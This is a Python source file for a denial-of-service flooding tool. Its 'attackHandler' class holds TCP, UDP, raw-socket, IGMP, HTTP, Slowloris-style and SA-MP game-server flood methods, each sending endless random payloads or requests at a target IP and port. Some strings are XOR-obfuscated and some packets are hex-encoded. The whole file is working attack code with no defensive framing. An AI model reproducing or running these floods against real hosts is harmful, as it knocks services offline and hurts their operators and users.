# Importing necessary libraries
import os
from os import system as _sys 
import sys
import time
from time import sleep as wait 
import socket
import random
import base64 as b64
import codecs
import ssl

# XOR Decryption
def xor_dec(string,key):
            letter = b64.b64decode( string.encode() ).decode()
            lkey = len(key)
            string = []
            num = 0
            for each in letter:
                if num >= lkey:
                    num = num % lkey
                string.append(chr(ord(each)^ord(key[num])))
                num += 1
            return "".join(string)

# Variable
useragents = [""]
ref = [""]
acceptall = [""]

key = "asdfghjkloiuytresxcvbnmliuytf"
packets = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),
codecs.decode("53414d509538e1a9611e63","hex_codec"),
codecs.decode("53414d509538e1a9611e69","hex_codec"),
codecs.decode("53414d509538e1a9611e72","hex_codec"),
codecs.decode("081e62da","hex_codec"),
codecs.decode("081e77da","hex_codec"),
codecs.decode("081e4dda","hex_codec"),
codecs.decode("021efd40","hex_codec"),
codecs.decode("021efd40","hex_codec"),
codecs.decode("081e7eda","hex_codec")
]
junk_strings = [
      xor_dec('IBwdBwoJSgkDGwcQDVU=', key),
      xor_dec('LBIAA0cKE0siChEAClRURT8dBhkMX19f', key),
      xor_dec('BgEBAxMSSh8DTyglLQNBRU9L', key),
      xor_dec('CQcQFhRSRUQLBh0dDBZcBhwVTDgHFhgWEw8D', key),
      xor_dec('CFMDCRNIAg4AAwhVGxsdERYKEA==', key),
      xor_dec('MicgRgEEBQQITwsUGw1TRFI=', key),
      xor_dec('CRIMB0cKCwUIGAABEVQVClMaEQQQHB8eGwcLBhQTARYUFRoY', key),
      xor_dec('JTcLNUcJHh8NDAJU', key),
      xor_dec('IBwdBwoJSgkDGwcQDVQAChATEFc=', key)
]
# Creating a class to handle attack function
class attackHandler():
    class Method():
        def _TCP(ip, port, packets):
            try:
                while True:
                    for _ in range(len(packets)):
                        random_ip = str(random.randint(0,255)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255))
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip, port))
                        response = "GET /" + random_ip + " HTTP/1.1\r\n"
                        response += "Host: " + random_ip + "\r\n\r\n"
                        byte_packet = random.randint(120000, 900000)
                        byte = random._urandom(byte_packet)
                        s.send(str.encode(response))
                        s.sendall(str.encode(response))
                        s.send(byte)
                        s.sendall(byte)
                        for _ in range(len(packets)):
                            s.send(str.encode(response))
                            s.sendall(str.encode(response))
                            s.send(byte)
                            s.sendall(byte)
            except socket.error:
                s.close()
        def _UDP(ip, port, packets):
            try:
                while True:
                    for _ in range(len(packets)):
                        random_ip = str(random.randint(0,255)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255))
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip, port))
                        response = "GET /" + random_ip + " HTTP/1.1\r\n"
                        response += "Host: " + random_ip + "\r\n\r\n"
                        byte_packet = random.randint(120000, 900000)
                        byte = random._urandom(byte_packet)
                        s.send(str.encode(response))
                        s.sendall(str.encode(response))
                        s.send(byte)
                        s.sendall(byte)
                        for _ in range(len(packets)):
                            s.send(str.encode(response))
                            s.sendall(str.encode(response))
                            s.send(byte)
                            s.sendall(byte)
            except socket.error:
                s.close()
        def _RAW(ip, port, packets):
            try:
                while True:
                    for _ in range(len(packets)):
                        random_ip = str(random.randint(0,255)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255))
                        s = socket.socket(socket.AF_INET, socket.SOCK_RAW)
                        s.connect((ip, port))
                        response = "GET /" + random_ip + " HTTP/1.1\r\n"
                        response += "Host: " + random_ip + "\r\n\r\n"
                        byte_packet = random.randint(120000, 900000)
                        byte = random._urandom(byte_packet)
                        s.send(str.encode(response))
                        s.sendall(str.encode(response))
                        s.send(byte)
                        s.sendall(byte)
                        for _ in range(len(packets)):
                            s.send(str.encode(response))
                            s.sendall(str.encode(response))
                            s.send(byte)
                            s.sendall(byte)
            except socket.error:
                s.close()
        def _SAMP(ip, port, packets):
            while True:
              for _ in range(len(packets)):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                pack = packets[random.randrange(0,3)]
                s.sendto(pack, (ip, int(port)))
                if(int(port) == 7777):
                  s.sendto(packets[5], (ip, int(port)))
                elif(int(port) == 7796):
                  s.sendto(packets[4], (ip, int(port)))
                elif(int(port) == 7771):
                  s.sendto(packets[6], (ip, int(port)))
                elif(int(port) == 7784):
                  s.sendto(packets[7], (ip, int(port)))
                elif(int(port) == 1111):
                  s.sendto(packets[9], (ip, int(port))) 
        def _IGMP(ip, port, packets):
            while True:
                try:
                    for _ in range(len(packets)):
                        byte = random._urandom(random.randint(600000, 900000))
                        s = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
                        s.connect((ip, port))
                        s.send(byte)
                        s.sendall(byte)
                        for y in range(len(packets)):
                            s.send(byte)
                            s.sendall(byte)
                except socket.error:
                    s.close()
        def _STD(ip, port, packets):
            while True:
                try:
                    for _ in range(len(packets)):
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip, port))
                        for _ in range(len(packets)):
                            s.send(random.choice(junk_strings).encode())
                except:
                    s.close()
        def _CC(ip, port, packets):
            while True:
                try:
                    for _ in range(len(packets)):
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip, port))
                        if int(port) == 443:
                            ctx = ssl.SSLContext()
                            s = ctx.wrap_socket(s, server_hostname=ip)
                        s.send("\000".encode())
                except socket.error:
                    s.close()
        def _HTTP(ip, port, packets):
            useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
            accept = random.choice(acceptall)
            referer = "Referer: " + random.choice(ref) + ip + "\r\n" 
            get_host = 'GET' + " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
            connection = "Connection: Keep-Alive\r\n"
            content    = "Content-Type: application/x-www-form-urlencoded\r\n"
            length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
            request  = get_host + useragent + accept + referer + content + length + "\r\n"
            while True:
                try:
                    for _ in range(len(packets)):
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip, port))
                        s.sendall(str.encode(request))
                        s.send(str.encode(request))
                        for _ in range(len(packets)):
                            s.sendall(str.encode(request))
                            s.send(str.encode(request))
                except:
                    s.close()
        def _SLOW(ip, port, packets):
            get_host = "GET /?" + str(random.randint(0,50000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
            connection = "Connection: Keep-Alive\r\n"
            useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
            accept = random.choice(acceptall)
            header = get_host + useragent + accept + connection
            while True:
                try:
                    for _ in range(len(packets)):
                        socket_list = []
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip, port))
                        if int(port) == 443:
                            ctx = ssl.SSLContext()
                            s = ctx.wrap_socket(s, server_hostname=ip)
                        s.send(str.encode(header))
                        socket_list.append(s)
                        while True:
                            for s in list(socket_list):
                                for _ in range(len(packets)):
                                    try:
                                        s.send("X-a: {}\r\n".format(random.randint(1, 50000)).encode("utf-8"))
                                    except:
                                        pass
                            for _ in range(len(packets)):
                                if port == 443:
                                    s = ssl.wrap_socket(s)
                                    s.send(str.encode(header))
                                    socket_list.append(s)
                except:
                    s.close()
